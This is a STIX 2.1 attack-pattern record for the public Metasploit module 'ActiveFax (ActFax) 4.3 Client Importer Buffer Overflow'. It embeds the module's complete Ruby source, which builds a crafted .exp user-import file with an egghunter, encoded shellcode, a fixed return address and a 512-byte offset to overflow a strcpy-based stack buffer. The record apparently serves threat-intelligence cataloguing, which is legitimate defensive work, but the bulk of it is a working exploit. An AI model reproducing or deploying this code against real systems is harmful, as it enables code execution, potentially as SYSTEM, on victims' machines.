{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1dbd10ed-3cd4-49bf-a252-9cd2d6c52375",
    "created": "2024-08-14T16:36:31.477805Z",
    "modified": "2024-08-14T16:36:31.477809Z",
    "name": "ActiveFax (ActFax) 4.3 Client Importer Buffer Overflow",
    "description": " This module exploits a vulnerability in ActiveFax Server. The vulnerability is a stack based buffer overflow in the \"Import Users from File\" function, due to the insecure usage of strcpy while parsing the csv formatted file. The module creates a .exp file that must be imported with ActiveFax Server. It must be imported with the default character set 'ECMA-94 / Latin 1 (ISO 8859)'. The module has been tested successfully on ActFax Server 4.32 over Windows XP SP3 and Windows 7 SP1. In the Windows XP case, when ActFax runs as a service, it will execute as SYSTEM.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/actfax_import_users_bof.rb",
            "external_id": "actfax_import_users_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.pwnag3.com/2012/08/actfax-local-privilege-escalation.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ActiveFax (ActFax) 4.3 Client Importer Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a vulnerability in ActiveFax Server. The vulnerability is\n        a stack based buffer overflow in the \"Import Users from File\" function, due to the\n        insecure usage of strcpy while parsing the csv formatted file. The module creates a\n        .exp file that must be imported with ActiveFax Server. It must be imported with the\n        default character set 'ECMA-94 / Latin 1 (ISO 8859)'. The module has been tested\n        successfully on ActFax Server 4.32 over Windows XP SP3 and Windows 7 SP1. In the\n        Windows XP case, when ActFax runs as a service, it will execute as SYSTEM.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Craig Freyman', # Vulnerability discovery and PoC\n          'Brandon Perry', # Metasploit module\n          'juan vazquez'   # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '85175' ],\n          [ 'EDB', '20915' ],\n          [ 'URL', 'http://www.pwnag3.com/2012/08/actfax-local-privilege-escalation.html' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'Space' => 4000,\n          'BadChars' => \"\",\n          'DisableNops' => true,\n        },\n\n      'Targets'        =>\n        [\n          [ 'ActFax 4.32 / Windows XP SP3 EN / Windows 7 SP1',\n            {\n              'Ret'\t  => 0x00401b22, # ret from ActFax.exe]\n              'Offset'  => 512\n            }\n          ]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2012-08-28',\n      'DefaultTarget'\t => 0))\n\n    register_options([OptString.new('FILENAME', [ false, 'The file name.', 'msf.exp']),])\n\n  end\n\n  def exploit\n\n    #These badchars do not apply to the final payload\n    badchars = (0x00..0x20).to_a.pack(\"C*\") + \"\\x7c\"\n\n    eggoptions =\n      {\n        :checksum => true,\n        :eggtag => 'w00t'\n      }\n\n    hunter,egg = generate_egghunter(payload.encoded, badchars, eggoptions)\n\n    [ 'x86/alpha_upper'].each { |name|\n      enc = framework.encoders.create(name)\n      if name =~/alpha/\n        enc.datastore.import_options_from_hash({ 'BufferRegister' => 'ESP' })\n      end\n      hunter = enc.encode(hunter, nil, nil, platform)\n    }\n\n    buffer = \"\\x83\\xC4\\x7f\" * 19 # add esp, byte 0xff\n    buffer << \"\\x83\\xC4\\x23\" # add esp, byte 0x23\n    buffer << hunter\n    buffer << rand_text(target['Offset'] - buffer.length, badchars)\n    buffer << [target.ret].pack(\"V\")\n    buffer << egg\n\n    file =  \"User Name\\tEntire User Name\\tPassword\\tAlias-Names\\tGroup\\tDirect Dialing\\tCost Account\\tPermissions\\tComments\\tUser-Defined\\t\"\n    file << \"Predefined Settings\\tName 1\\tName 2\\tName 3\\tName 4\\tName 5\\tDepartment\\tAttention of\\tPhone 1\\tPhone 2\\tFax Number\\tE-Mail\\t\"\n    file << \"Coverpage Non-Windows\\tOverlay Non-Windows\\tCoverpage Windows\\tOverlay Windows\\tUser-Defined\\tPrinter Settings\\tAutomatic Printing Outgoing\\t\"\n    file << \"Printer Name Outgoing\\tReport Outgoing\\tAutomatic Printing Incoming\\tPrinter Name Incoming\\tReport Incoming\\tNotification Outgoing\\t\"\n    file << \"Email Outgoing\\tNotification Incoming\\tEmail Incoming\\tAttach Original Message\\tUser-Defined Archive Settings\\tExport Outgoing\\t\"\n    file << \"Export Incoming\\tExport-Path\\tMark as Read\\r\\n\"\n    file << buffer\n    file << \"\\r\\n\"\n\n    file_create(file)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-08-28",
    "x_mitre_platforms": [
        "win'"
    ]
}